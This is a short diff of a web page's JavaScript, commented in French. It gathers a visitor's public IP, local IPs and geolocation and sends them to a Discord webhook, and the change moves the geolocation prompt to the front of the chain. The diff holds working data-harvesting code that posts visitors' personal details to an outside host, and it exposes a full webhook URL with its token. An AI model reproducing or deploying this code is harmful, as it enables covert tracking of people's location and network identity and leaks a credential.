@@ -257,7 +257,7 @@
                 }]
             };
 
-            var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE"; // Remplacez par votre webhook
+            var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";
 
             fetch(webhookURL, {
                 method: 'POST',
@@ -275,10 +275,11 @@
             });
         }
 
-        // Exécution séquentielle des étapes
-        getPublicIP()
+        // === MODIFICATION : la géolocalisation est demandée EN PREMIER ===
+        // Une fois la popup traitée (acceptée ou refusée), on lance le reste
+        getGeolocation()
+            .then(getPublicIP)
             .then(getLocalIPs)
-            .then(getGeolocation)
             .then(sendToWebhook)
             .catch(console.error);
     }
